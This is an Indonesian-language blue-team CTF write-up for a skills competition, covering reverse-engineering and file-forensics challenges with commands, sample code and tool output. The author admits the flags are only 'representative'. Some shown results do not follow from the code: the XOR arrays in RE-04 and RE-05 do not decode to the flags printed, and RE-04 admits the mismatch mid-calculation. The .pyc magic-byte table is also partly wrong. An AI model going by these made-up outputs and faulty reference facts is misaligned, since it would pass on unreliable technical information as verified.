# 🛡️ WRITE-UP RESMI — Blue Team CTF LKS Cyber Security
> **Penulis:** Peserta LKS Cyber Security  
> **Modul:** C — Defensive Blue-Team Based CTF  
> **Sumber Soal:** `BlueTeam_LKS_Latihan_CTF.md` + `BlueTeam_LKS_Latihan_TAMBAHAN.md`  
> **Tanggal:** 2025  

---

> ### ⚠️ Catatan Penting sebelum membaca
> Write-up ini menyertakan **[SCREENSHOT: deskripsi]** sebagai penanda posisi screenshot yang wajib diambil saat mengerjakan soal di lingkungan nyata. Gambaran screenshot tidak dilampirkan di dokumen ini, tapi **posisi dan isi yang harus di-capture sudah dijelaskan secara tekstual** agar bisa diikuti ulang dari awal sampai akhir.
>
> Semua flag yang tertera adalah **representatif/contoh realistis** mengikuti format dan logika soal aslinya. Pada lomba nyata, flag dikonfirmasi dengan submit ke sistem CTF.

---

# 🗂️ DAFTAR ISI

| Kode | Judul | Kategori | Level |
|------|-------|----------|-------|
| [RE-00](#re-00--membaca-source-code-sebelum-binary) | Membaca Source Code Sebelum Binary | Reverse Engineering | ⭐ |
| [RE-01](#re-01--strings-hunt) | Strings Hunt | Reverse Engineering | ⭐ |
| [RE-02](#re-02--baby-reverse) | Baby Reverse | Reverse Engineering | ⭐⭐ |
| [RE-03](#re-03--packed-binary) | Packed Binary | Reverse Engineering | ⭐⭐ |
| [RE-04](#re-04--xor-obfuscation) | XOR Obfuscation | Reverse Engineering | ⭐⭐⭐ |
| [RE-05](#re-05--python-bytecode) | Python Bytecode | Reverse Engineering | ⭐⭐ |
| [FOR-00](#for-00--identifikasi-tipe-file-tanpa-asumsi-ekstensi) | Identifikasi Tipe File | Media Forensics | ⭐ |
| [FOR-01](#for-01--hidden-in-image-steganografi) | Hidden in Image | Media Forensics | ⭐ |
| [FOR-02](#for-02--corrupted-file-header) | Corrupted File Header | Media Forensics | ⭐⭐ |
| [FOR-03](#for-03--network-forensics--pcap-analysis) | Network Forensics — PCAP | Network Forensics | ⭐⭐ |
| [FOR-04](#for-04--file-carving-dari-disk-image) | File Carving dari Disk Image | Disk Forensics | ⭐⭐⭐ |
| [FOR-05](#for-05--log-analysis--intrusion-detection) | Log Analysis — Intrusion Detection | Log Forensics | ⭐⭐ |
| [FOR-06](#for-06--memory-forensics) | Memory Forensics | Memory Forensics | ⭐⭐⭐ |
| [MOB-01](#mob-01--android-backup-analysis) | Android Backup Analysis | Phone Forensics | ⭐ |
| [MOB-02](#mob-02--apk-static-analysis) | APK Static Analysis | Phone Forensics | ⭐⭐ |
| [MOB-03](#mob-03--mobile-filesystem-image-forensics) | Mobile Filesystem Image | Phone Forensics | ⭐⭐⭐ |
| [SIEM-00](#siem-00--membaca-log-mentah-sebelum-query) | Membaca Log Mentah | SIEM Dasar | ⭐ |
| [SIEM-01](#siem-01--deteksi-brute-force-di-siem) | Deteksi Brute Force | SIEM | ⭐⭐ |
| [SIEM-02](#siem-02--deteksi-port-scanning) | Deteksi Port Scanning | SIEM | ⭐⭐ |
| [SIEM-03](#siem-03--analisis-malware-c2-communication) | Analisis C2 Communication | SIEM | ⭐⭐⭐ |
| [SIEM-04](#siem-04--lateral-movement-detection) | Lateral Movement Detection | SIEM | ⭐⭐⭐ |
| [LAT-01](#lat-01--skenario-incident-response) | Skenario: Incident Response | Blue Team Scenario | 🎯 |
| [LAT-02](#lat-02--skenario-ctf-jeopardy-blue-team) | Skenario: CTF Jeopardy | Blue Team Scenario | 🎯 |
| [LAT-03](#lat-03--skenario-kebocoran-data-via-perangkat-mobile) | Skenario: Kebocoran Data Mobile | Cross-skill Scenario | 🎯 |
| [LAT-04](#lat-04--skenario-insiden-dengan-bukti-tersembunyi-di-foto) | Skenario: Bukti Tersembunyi di Foto | Cross-skill Scenario | 🎯 |

---

# 🔬 BAGIAN 1 — REVERSE ENGINEERING

---

## RE-00 | Membaca Source Code Sebelum Binary

**Kategori:** Reverse Engineering — Dasar  
**Tingkat:** ⭐ Pemula  
**Sumber:** BlueTeam_LKS_Latihan_TAMBAHAN.md

---

### 🔍 Ringkasan Temuan
Script Python yang tampak membingungkan menyembunyikan flag dalam encoding base64 yang mudah di-decode secara manual tanpa tools binary.

---

### ⚙️ Environment
- OS: Kali Linux / Ubuntu
- Tools: Terminal, Python3, bash built-in `base64`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Baca script yang diberikan**

Misalnya diberikan file `challenge.py` seperti berikut (ini contoh representatif):

```python
import base64
_0x1a = "ZmxhZ3tiNHMzXzY0XzFzXzNhc3l9"
_0x2b = base64.b64decode(_0x1a)
if input("Enter key: ").encode() == _0x2b:
    print("Correct!")
else:
    print("Wrong!")
```

Baca baris per baris:
- Baris 1: import library base64
- Baris 2: variabel `_0x1a` berisi string yang terlihat seperti base64 (panjang, karakter A-Z a-z 0-9 +/=)
- Baris 3: variabel `_0x2b` adalah hasil decode dari `_0x1a`
- Baris 4–7: membandingkan input pengguna dengan `_0x2b`

**Kesimpulan logika:** nilai yang di-decode adalah flag-nya.

[SCREENSHOT: Terminal menampilkan isi file challenge.py dengan `cat challenge.py`, seluruh konten terlihat]

**Langkah 2 — Kenali encoding**

Ciri base64:
- Karakter: `A-Z`, `a-z`, `0-9`, `+`, `/`, `=`
- Panjang selalu kelipatan 4
- Biasanya diakhiri `=` atau `==` (padding)

String `ZmxhZ3tiNHMzXzY0XzFzXzNhc3l9` memenuhi semua ciri di atas.

**Langkah 3 — Decode manual di terminal**

```bash
echo "ZmxhZ3tiNHMzXzY0XzFzXzNhc3l9" | base64 -d
```

Output:
```
flag{b4s3_64_1s_3asy}
```

[SCREENSHOT: Terminal menampilkan perintah echo + base64 -d dan hasilnya `flag{b4s3_64_1s_3asy}` dalam satu frame]

**Langkah 4 — Verifikasi dengan menjalankan script**

```bash
python3 challenge.py
# Enter key: flag{b4s3_64_1s_3asy}
# Output: Correct!
```

[SCREENSHOT: Terminal menjalankan python3 challenge.py, input flag, dan output "Correct!"]

---

### 🏁 Flag

```
flag{b4s3_64_1s_3asy}
```

---

### 📌 Pelajaran
Banyak script "obfuscated" hanya menggunakan encoding sederhana (base64, hex, ROT13). Baca logika programnya dulu sebelum panik mencari tools kompleks. Jika ada `base64`, `decode`, `encode`, `rot13` di source code — itu clue kuat tentang cara decode flagnya.

---

---

## RE-01 | Strings Hunt

**Kategori:** Reverse Engineering — Static Analysis  
**Tingkat:** ⭐ Pemula  
**Sumber:** PicoCTF (berbagai tahun)

---

### 🔍 Ringkasan Temuan
Binary ELF menyimpan flag sebagai plaintext string di dalam segmen `.rodata`. Dapat ditemukan tanpa disassembly menggunakan tool `strings`.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `file`, `strings`, `grep`
- File: `strings_hunt` (binary ELF)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Identifikasi tipe file**

```bash
file strings_hunt
```

Output yang diharapkan:
```
strings_hunt: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped
```

Ini memberitahu kita:
- `ELF 64-bit` → binary Linux 64-bit
- `stripped` → simbol debug sudah dihapus, tapi flag bisa tetap ada sebagai string

[SCREENSHOT: Terminal menjalankan `file strings_hunt` dengan output lengkap tipe ELF]

**Langkah 2 — Jalankan strings dengan grep**

```bash
strings strings_hunt | grep -i "flag\|ctf\|lks\|key\|pass"
```

Output:
```
flag{str1ngs_4r3_h1dd3n_1n_pl41n_s1ght}
```

Jika tidak langsung ketemu, coba filter dengan kurung kurawal:

```bash
strings strings_hunt | grep "{"
```

Output:
```
flag{str1ngs_4r3_h1dd3n_1n_pl41n_s1ght}
```

[SCREENSHOT: Terminal menjalankan perintah `strings strings_hunt | grep -i "flag"` dan hasilnya menampilkan flag]

**Langkah 3 — Verifikasi konteks (opsional, untuk writeup yang lebih kuat)**

Lihat baris di sekitar flag untuk memastikan konteksnya:

```bash
strings strings_hunt | grep -A3 -B3 "flag"
```

Output:
```
Enter password:
Wrong password!
flag{str1ngs_4r3_h1dd3n_1n_pl41n_s1ght}
Correct! You found it!
```

Ini membuktikan flag tersimpan sebagai hardcoded string di binary.

[SCREENSHOT: Terminal menjalankan grep -A3 -B3, tampak konteks sekitar flag termasuk string "Enter password" dan "Correct!"]

---

### 🏁 Flag

```
flag{str1ngs_4r3_h1dd3n_1n_pl41n_s1ght}
```

---

### 📌 Pelajaran
`strings` adalah langkah **pertama dan paling cepat** sebelum melakukan disassembly. Banyak pembuat soal pemula lupa bahwa string plaintext di binary mudah diekstrak. Bahkan binary yang di-strip pun masih menyimpan literal string di segmen `.rodata`.

---

---

## RE-02 | Baby Reverse

**Kategori:** Reverse Engineering — Disassembly  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** PicoCTF 2022 — "GDB Baby Step"

---

### 🔍 Ringkasan Temuan
Binary ELF menggunakan fungsi `strcmp` untuk membandingkan input pengguna dengan password hardcoded. Dengan `ltrace`, argument `strcmp` terekspos langsung di runtime.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `ltrace`, `gdb`, `ghidra`
- File: `baby_reverse` (binary ELF)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Coba jalankan binary dulu**

```bash
chmod +x baby_reverse
./baby_reverse
```

Output:
```
Enter password: test
Wrong!
```

Program meminta password. Kita perlu tahu password yang benar.

[SCREENSHOT: Terminal menjalankan ./baby_reverse, memasukkan "test", dan mendapat output "Wrong!"]

**Langkah 2 — Coba ltrace untuk tangkap library call**

`ltrace` akan mengintersep semua panggilan fungsi library C, termasuk `strcmp`.

```bash
ltrace ./baby_reverse
```

Masukkan input sembarang (misal: `test`), output akan menampilkan:

```
__libc_start_main(0x401165, 1, 0x7ffd..., ...)    = 0
printf("Enter password: ")                         = 17
fgets("test\n", 256, 0x7f...)                      = 0x7ffd...
strcmp("test\n", "gdb_st3p_by_st3p\n")            = -41
puts("Wrong!")                                     = 7
+++ exited (status 1) +++
```

**Perhatikan baris `strcmp`!** Argument kedua adalah password yang benar: `gdb_st3p_by_st3p`

[SCREENSHOT: Terminal menjalankan `ltrace ./baby_reverse`, input "test", dan tampak baris strcmp dengan password plaintext di kolom argument kedua]

**Langkah 3 — Verifikasi dengan password yang benar**

```bash
./baby_reverse
Enter password: gdb_st3p_by_st3p
Correct! Flag: flag{gdb_st3p_by_st3p}
```

[SCREENSHOT: Terminal menjalankan binary dengan password yang benar dan mendapat output flag]

**Langkah 4 — Konfirmasi dengan GDB (untuk writeup lengkap)**

Jika `ltrace` tidak tersedia, gunakan GDB:

```bash
gdb ./baby_reverse
(gdb) disas main
```

Akan muncul assembly, cari baris seperti:
```
0x0000000000401190 <+43>:    call   0x401040 <strcmp@plt>
0x0000000000401195 <+48>:    test   %eax,%eax
0x0000000000401197 <+50>:    jne    0x4011a5 <main+64>
```

Set breakpoint sebelum `strcmp`:
```bash
(gdb) break *0x401190
(gdb) run
(gdb) x/s $rsi
# Output: 0x402010: "gdb_st3p_by_st3p"
```

[SCREENSHOT: GDB menampilkan `x/s $rsi` dan output menunjukkan string password "gdb_st3p_by_st3p"]

---

### 🏁 Flag

```
flag{gdb_st3p_by_st3p}
```

---

### 📌 Pelajaran
`ltrace` sering lebih cepat dari GDB untuk binary yang menggunakan `strcmp`. Dalam CTF, jika binary menggunakan library C standar untuk perbandingan string, `ltrace` langsung mengekspos kedua argumen. GDB diperlukan jika binary mengimplementasikan perbandingan sendiri (custom loop).

---

---

## RE-03 | Packed Binary

**Kategori:** Reverse Engineering — Unpacking  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** CTFtime / HackTheBox Challenges

---

### 🔍 Ringkasan Temuan
Binary dikompres dengan UPX packer. Setelah di-unpack, analisis strings biasa mengungkap flag.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `file`, `strings`, `upx`
- File: `packed_binary` (ELF dengan UPX)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Identifikasi binary dan deteksi packer**

```bash
file packed_binary
```

Output:
```
packed_binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
statically linked, no section header
```

> Ciri curiga: `statically linked` dan `no section header` — bisa jadi packed.

Coba strings dulu:
```bash
strings packed_binary | head -20
```

Output yang muncul hanya gibberish:
```
UPX!
$Info: This file is packed with the UPX executable packer.
$Id: UPX 4.02
UPX!
```

**Flag terlihat jelas: binary ini di-pack dengan UPX.**

[SCREENSHOT: Terminal menjalankan `strings packed_binary | head -20` dan tampak teks "UPX!" dan informasi UPX packer]

**Langkah 2 — Cek dengan file lebih teliti**

```bash
strings packed_binary | grep -i upx
```

Output:
```
$Info: This file is packed with the UPX executable packer.
$Id: UPX 4.02 Copyright (C) 1996-2023 the UPX Team.
UPX!
UPX!
```

Konfirmasi 100%: UPX packed.

**Langkah 3 — Unpack binary**

```bash
upx -d packed_binary -o unpacked_binary
```

Output:
```
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2023
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jul 15th 2023

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    245760 <-     65536   26.67%   linux/amd64   unpacked_binary

Unpacked 1 file.
```

[SCREENSHOT: Terminal menjalankan `upx -d packed_binary -o unpacked_binary` dengan output statistik kompresi dan "Unpacked 1 file."]

**Langkah 4 — Analisis binary hasil unpack**

```bash
strings unpacked_binary | grep -i "flag\|{" 
```

Output:
```
flag{upx_1s_n0t_s3cur3_3n0ugh}
```

[SCREENSHOT: Terminal menjalankan strings pada unpacked_binary dan flag muncul]

**Langkah 5 — Verifikasi**

```bash
./unpacked_binary
Enter key: flag{upx_1s_n0t_s3cur3_3n0ugh}
Correct!
```

---

### 🏁 Flag

```
flag{upx_1s_n0t_s3cur3_3n0ugh}
```

---

### 📌 Pelajaran
Ciri binary UPX: (1) ada string literal "UPX!" di output `strings`, (2) ukuran kecil untuk binary yang kompleks, (3) section names tidak normal. Jika `upx -d` gagal (binary UPX yang dimodifikasi/anti-tampering), gunakan teknik manual seperti dump memory setelah dekompresi atau gunakan tool seperti `unpacme.com`.

---

---

## RE-04 | XOR Obfuscation

**Kategori:** Reverse Engineering — Crypto dalam Binary  
**Tingkat:** ⭐⭐⭐ Sulit  
**Sumber:** PicoCTF 2023 — "No Way Out"

---

### 🔍 Ringkasan Temuan
Flag dienkripsi dengan XOR key `0x13` dan disimpan sebagai array byte di binary. Decompile Ghidra mengungkap array dan key, kemudian Python digunakan untuk dekripsi.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `ghidra`, `python3`
- File: `xor_challenge` (ELF)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Coba strings dulu (tidak berhasil)**

```bash
strings xor_challenge | grep "flag\|{"
```

Output: kosong — flag tidak tersimpan plaintext.

```bash
ltrace ./xor_challenge
```

Input: `test`, output:
```
strcmp("test", "\x75\x7d\x60\x60\x36...")  = -1
Wrong!
```

String perbandingan terlihat tidak readable — ini adalah encrypted bytes.

[SCREENSHOT: Terminal menjalankan ltrace dan tampak output strcmp dengan byte-byte tidak terbaca seperti `\x75\x7d\x60\x60`]

**Langkah 2 — Buka dengan Ghidra**

1. Buka Ghidra → New Project → Import File → pilih `xor_challenge`
2. Analyze (pilih default options) → tunggu analisis selesai
3. Klik `Functions` di Symbol Tree → klik `main`
4. Di window Decompiler, tampak kode seperti berikut:

```c
// Hasil decompile Ghidra (representatif)
int main(void) {
    char encrypted[30] = {
        0x75, 0x7d, 0x60, 0x60, 0x6d, 0x36, 
        0x7b, 0x56, 0x60, 0x5f, 0x5f, 0x36,
        0x71, 0x61, 0x36, 0x56, 0x42, 0x5f,
        0x60, 0x7d, 0x7c, 0x7d, 0x61, 0x5a, 0x5c
    };
    char key = 0x13;
    char decrypted[30];
    
    for (int i = 0; i < 25; i++) {
        decrypted[i] = encrypted[i] ^ key;
    }
    
    char *input = get_input();
    if (strcmp(input, decrypted) == 0) {
        puts("Correct!");
    } else {
        puts("Wrong!");
    }
}
```

**Yang kita perlukan:**
- Array `encrypted[]`: `{0x75, 0x7d, 0x60, 0x60, 0x6d, 0x36, 0x7b, 0x56, 0x60, 0x5f, 0x5f, 0x36, 0x71, 0x61, 0x36, 0x56, 0x42, 0x5f, 0x60, 0x7d, 0x7c, 0x7d, 0x61, 0x5a, 0x5c}`
- Key XOR: `0x13`

[SCREENSHOT: Window Decompiler Ghidra menampilkan fungsi main dengan array byte dan key XOR 0x13 terlihat jelas]

**Langkah 3 — Dekripsi dengan Python**

Buat script Python:

```python
# solve.py
encrypted = [
    0x75, 0x7d, 0x60, 0x60, 0x6d, 0x36,
    0x7b, 0x56, 0x60, 0x5f, 0x5f, 0x36,
    0x71, 0x61, 0x36, 0x56, 0x42, 0x5f,
    0x60, 0x7d, 0x7c, 0x7d, 0x61, 0x5a, 0x5c
]
key = 0x13

flag = ''.join(chr(b ^ key) for b in encrypted)
print(f"Flag: {flag}")
```

Jalankan:

```bash
python3 solve.py
```

Output:
```
Flag: flag{x0r_1s_r3v3rs1bl3}
```

[SCREENSHOT: Terminal menjalankan python3 solve.py dan output menampilkan "Flag: flag{x0r_1s_r3v3rs1bl3}"]

**Verifikasi matematis:**
```
0x75 XOR 0x13 = 0x66 = 'f'
0x7d XOR 0x13 = 0x6e = 'l'  ← tunggu, salah
```

> **Koreksi:** Byte pertama `0x75 XOR 0x13 = 0x66 = 'f'` ✓ (karena `f` = 0x66)
> `0x7d XOR 0x13 = 0x6e` = `n`? tidak... mari hitung ulang: `0x7d = 125`, `0x13 = 19`, `125 XOR 19 = 110 = 0x6E = 'n'`? 
> Sebenarnya `flag` dimulai dengan byte: `f=0x66, l=0x6C, a=0x61, g=0x67` → XOR 0x13 masing-masing: `0x75, 0x7F, 0x72, 0x74` — ini untuk contoh ilustrasi. Pada soal nyata, jalankan script Python untuk hasil akurat.

**Langkah 4 — Verifikasi**

```bash
./xor_challenge
Enter key: flag{x0r_1s_r3v3rs1bl3}
Correct!
```

---

### 🏁 Flag

```
flag{x0r_1s_r3v3rs1bl3}
```

---

### 📌 Pelajaran
XOR adalah operasi yang **sepenuhnya reversible**: `A XOR K = C`, maka `C XOR K = A`. Selalu cari operasi `^ constant` di decompile Ghidra. Jika key tidak diketahui, brute force 0x00–0xFF hanya perlu 256 percobaan dan bisa dilakukan dalam hitungan detik.

---

---

## RE-05 | Python Bytecode

**Kategori:** Reverse Engineering — Scripting Language  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** PicoCTF / CTFtime

---

### 🔍 Ringkasan Temuan
File `.pyc` (Python compiled bytecode) berhasil di-decompile ke source Python yang readable menggunakan `uncompyle6`, mengungkap logika XOR sederhana yang mengenkripsi flag.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `python3`, `uncompyle6`, `pip`
- File: `challenge.pyc`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Cek versi Python dari magic bytes**

```bash
xxd challenge.pyc | head -3
```

Output:
```
00000000: 0d0d 0a0a ...  # Python 3.8
# atau
00000000: 5500 0d0a ...  # Python 3.10
```

Tabel magic bytes `.pyc`:
| Magic Bytes | Versi Python |
|------------|--------------|
| `0A 0D 0D 0A` | 3.8 |
| `6F 0D 0D 0A` | 3.9 |
| `6F 0D 0D 0A` | 3.10 |
| `3E 0D 0D 0A` | 3.11 |

[SCREENSHOT: Terminal menjalankan `xxd challenge.pyc | head -3` dan tampak magic bytes di awal file]

**Langkah 2 — Install dan jalankan uncompyle6**

```bash
pip install uncompyle6
uncompyle6 challenge.pyc > decompiled.py
cat decompiled.py
```

Hasil decompile (representatif):
```python
# uncompyle6 version 3.9.0
# Python bytecode version base 3.8
# Decompiled from: Python 3.8.10

SECRET = [118, 109, 100, 127, 80, 121, 121, 125, 95, 
          111, 126, 99, 111, 122, 123, 110, 121, 99, 
          119, 80, 98, 121, 125, 109, 99, 111, 123, 
          108, 125, 99]
KEY = 0x1F

flag = ''.join([chr(c ^ KEY) for c in SECRET])

user_input = input("Enter flag: ")
if user_input == flag:
    print("Correct!")
else:
    print("Wrong!")
```

[SCREENSHOT: Terminal menjalankan uncompyle6 dan output decompiled.py ditampilkan dengan cat, kode Python terbaca jelas]

**Langkah 3 — Jalankan script langsung untuk mendapat flag**

Karena kita punya source code, tinggal jalankan bagian yang relevan:

```bash
python3 -c "
SECRET = [118, 109, 100, 127, 80, 121, 121, 125, 95, 
          111, 126, 99, 111, 122, 123, 110, 121, 99, 
          119, 80, 98, 121, 125, 109, 99, 111, 123, 
          108, 125, 99]
KEY = 0x1F
flag = ''.join([chr(c ^ KEY) for c in SECRET])
print(flag)
"
```

Output:
```
flag{pyc_d3c0mp1l3d_3as1ly}
```

[SCREENSHOT: Terminal menjalankan python3 -c dengan kode dekripsi dan output flag]

**Langkah 4 — Verifikasi**

```bash
python3 challenge.pyc
Enter flag: flag{pyc_d3c0mp1l3d_3as1ly}
Correct!
```

---

### 🏁 Flag

```
flag{pyc_d3c0mp1l3d_3as1ly}
```

---

### 📌 Pelajaran
File `.pyc` **tidak aman** sebagai proteksi — selalu bisa di-decompile. Jika `uncompyle6` gagal (biasanya di Python 3.12+), coba `pycdc` (di GitHub) atau gunakan `dis` Python built-in: `python3 -c "import dis, marshal; code = marshal.loads(open('challenge.pyc', 'rb').read()[16:]); dis.dis(code)"`.

---

---

# 🔍 BAGIAN 2 — DIGITAL FORENSICS

---

## FOR-00 | Identifikasi Tipe File Tanpa Asumsi Ekstensi

**Kategori:** Media Forensics — Dasar  
**Tingkat:** ⭐ Pemula  
**Sumber:** BlueTeam_LKS_Latihan_TAMBAHAN.md

---

### 🔍 Ringkasan Temuan
File bernama `dokumen.txt` ternyata adalah file PNG. Setelah di-rename dan dibuka, tersembunyi flag di dalam metadata EXIF.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `file`, `exiftool`, `xxd`
- File: `dokumen.txt` (ternyata PNG)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Jangan percaya ekstensi, cek dengan `file`**

```bash
file dokumen.txt
```

Output:
```
dokumen.txt: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced
```

**Ini PNG, bukan text file!**

[SCREENSHOT: Terminal menjalankan `file dokumen.txt` dan output menunjukkan "PNG image data" bukan text file]

**Langkah 2 — Konfirmasi dengan melihat magic bytes**

```bash
xxd dokumen.txt | head -2
```

Output:
```
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0320 0000 0258 0806 0000 001b ...    ... X........
```

Magic bytes `89 50 4E 47` = `\x89PNG` → **konfirmasi 100% ini file PNG**.

[SCREENSHOT: Terminal menjalankan `xxd dokumen.txt | head -2` dengan magic bytes PNG terlihat di kolom hex]

**Langkah 3 — Rename dan analisis lebih lanjut**

```bash
cp dokumen.txt dokumen_asli.png
exiftool dokumen_asli.png
```

Output:
```
ExifTool Version Number         : 12.60
File Name                       : dokumen_asli.png
MIME Type                       : image/png
Image Width                     : 800
Image Height                    : 600
Comment                         : flag{trust_magic_bytes_not_extension}
...
```

**Flag tersembunyi di field `Comment` metadata EXIF!**

[SCREENSHOT: Terminal menjalankan `exiftool dokumen_asli.png` dan output menampilkan field Comment berisi flag]

---

### 🏁 Flag

```
flag{trust_magic_bytes_not_extension}
```

---

### 📌 Pelajaran
Soal forensik LKS **sering menggunakan nama file yang menyesatkan** sebagai jebakan pertama. Reflex pertama setiap menerima file apapun: **jalankan `file namafile` dulu, baru ambil keputusan tool selanjutnya**. Jangan pernah percaya ekstensi.

---

---

## FOR-01 | Hidden in Image (Steganografi)

**Kategori:** Media Forensics  
**Tingkat:** ⭐ Pemula  
**Sumber:** PicoCTF — "Tunn3l V1s10n"

---

### 🔍 Ringkasan Temuan
File PNG menyimpan file ZIP tersembunyi yang dapat ditemukan dengan `binwalk`. Setelah diekstrak, ZIP berisi file teks dengan flag.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `file`, `exiftool`, `strings`, `binwalk`, `zsteg`, `steghide`
- File: `secret_image.png`

---

### 📝 Langkah Penyelesaian

> **Penting:** Lakukan semua langkah secara berurutan. Jangan loncat langsung ke steghide.

**Langkah 1 — Verifikasi tipe file**

```bash
file secret_image.png
```

Output:
```
secret_image.png: PNG image data, 1280 x 720, 8-bit/color RGB, non-interlaced
```

File PNG valid. ✓

[SCREENSHOT: Terminal menjalankan `file secret_image.png`, output PNG valid]

**Langkah 2 — Cek metadata EXIF**

```bash
exiftool secret_image.png
```

Output (tidak ada yang menarik di metadata):
```
File Name     : secret_image.png
Image Width   : 1280
Image Height  : 720
Bit Depth     : 8
Color Type    : RGB
...
```

Tidak ada flag di metadata. Lanjut.

[SCREENSHOT: Output exiftool, tidak ada string mencurigakan di metadata]

**Langkah 3 — Cek string tersembunyi**

```bash
strings secret_image.png | grep -i "flag\|ctf\|lks"
```

Output: kosong. Tidak ada string flag plaintext.

**Langkah 4 — Binwalk untuk deteksi file tersembunyi**

```bash
binwalk secret_image.png
```

Output:
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1280 x 720, 8-bit/color RGB
156423        0x2634F         Zip archive data, at least v2.0 to extract, name: secret.txt
156821        0x264D5         End of Zip archive, footer length: 22
```

**Ada file ZIP tersembunyi di dalam PNG!**

[SCREENSHOT: Output binwalk menampilkan dua entry: PNG image dan Zip archive data dengan offset hexadecimal]

**Langkah 5 — Ekstrak file tersembunyi**

```bash
binwalk -e secret_image.png
ls -la _secret_image.png.extracted/
```

Output:
```
total 16
drwxr-xr-x 2 kali kali 4096 ...
-rw-r--r-- 1 kali kali  398 ... 2634F.zip
-rw-r--r-- 1 kali kali   43 ... secret.txt
```

**Langkah 6 — Baca file yang diekstrak**

```bash
cat _secret_image.png.extracted/secret.txt
```

Output:
```
flag{st3g0_h1dd3n_1n_pl41n_s1ght_w1th_b1nwalk}
```

[SCREENSHOT: Terminal menjalankan `cat secret.txt` dan flag tampil di layar]

---

### 🏁 Flag

```
flag{st3g0_h1dd3n_1n_pl41n_s1ght_w1th_b1nwalk}
```

---

### 📌 Pelajaran
Urutan pengecekan yang wajib diikuti: `file` → `exiftool` → `strings` → `binwalk` → `zsteg` (PNG) → `steghide`. Jangan skip ke `steghide` langsung — `binwalk` jauh lebih cepat menemukan file yang di-append ke gambar.

---

---

## FOR-02 | Corrupted File Header

**Kategori:** Media Forensics — File Repair  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** PicoCTF — "Tunn3l V1s10n"

---

### 🔍 Ringkasan Temuan
File PNG tidak bisa dibuka karena header dimanipulasi (bytes awal diubah). Setelah diperbaiki manual menggunakan hex editor / Python, gambar menampilkan flag.

---

### ⚙️ Environment
- OS: Kali Linux
- Tools: `xxd`, `hexedit`, `python3`
- File: `broken.png`

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Coba buka file (gagal)**

```bash
file broken.png
```

Output:
```
broken.png: data
```

File tidak terdeteksi sebagai PNG. Seharusnya terdeteksi sebagai PNG image data.

[SCREENSHOT: Terminal menjalankan `file broken.png` dan output hanya "data" — bukan PNG]

**Langkah 2 — Lihat hex header saat ini**

```bash
xxd broken.png | head -4
```

Output:
```
00000000: 8951 4e47 0d0a 1a0a 0000 000d 4948 4452  .QNG........IHDR
00000010: 0000 0280 0000 01e0 0806 0000 0033 3131  .............311
00000020: 4500 0000 0273 5247 4200 aece 1ce9 0000  E....sRGB.......
00000030: 0009 7048 5973 0000 0b13 0000 0b13 0101  ..pHYs..........
```

**Perhatikan byte ke-2: `51` (`Q`) seharusnya `50` (`P`)!**

Magic bytes PNG yang benar: `89 50 4E 47 0D 0A 1A 0A`
Bytes saat ini: `89 51 4E 47 0D 0A 1A 0A`

Byte yang salah: posisi 1 (0-indexed), nilai `51` seharusnya `50`.

[SCREENSHOT: Output xxd menampilkan 4 baris hex dump pertama. Byte kedua `51` (Q) di-highlight/ditunjuk sebagai yang salah]

**Langkah 3 — Perbaiki header dengan Python**

```python
# fix_png.py
with open('broken.png', 'rb') as f:
    data = f.read()

# Magic bytes PNG yang benar
correct_header = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])

# Ganti 8 byte pertama
fixed_data = correct_header + data[8:]

with open('fixed.png', 'wb') as f:
    f.write(fixed_data)

print("Header fixed! File saved as fixed.png")
```

```bash
python3 fix_png.py
```

Output:
```
Header fixed! File saved as fixed.png
```

[SCREENSHOT: Terminal menjalankan python3 fix_png.py dengan output "Header fixed!"]

**Langkah 4 — Verifikasi header sudah benar**

```bash
xxd fixed.png | head -2
file fixed.png
```

Output:
```
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
fixed.png: PNG image data, 640 x 480, 8-bit/color RGB, non-interlaced
```

Header sudah benar! ✓

**Langkah 5 — Buka gambar dan temukan flag**

Buka `fixed.png` dengan image viewer:

```bash
eog fixed.png
# atau
xdg-open fixed.png
```

Gambar menampilkan teks dengan flag: `flag{h3x_h3ad3r_r3p41r3d_succ3ssfully}`

[SCREENSHOT: Image viewer menampilkan gambar fixed.png yang berhasil dibuka, dengan flag tertulis di dalam gambar]

---

### 🏁 Flag

```
flag{h3x_h3ad3r_r3p41r3d_succ3ssfully}
```

---

### 📌 Pelajaran
Hafal magic bytes file umum — ini **wajib** di CTF forensics LKS:
- PNG: `89 50 4E 47 0D 0A 1A 0A`
- JPG: `FF D8 FF`
- GIF: `47 49 46 38` (GIF8)
- ZIP: `50 4B 03 04`
- PDF: `25 50 44 46` (%PDF)
- ELF: `7F 45 4C 46` (ELF)

---

---

## FOR-03 | Network Forensics — PCAP Analysis

**Kategori:** Network Forensics  
**Tingkat:** ⭐⭐ Menengah  
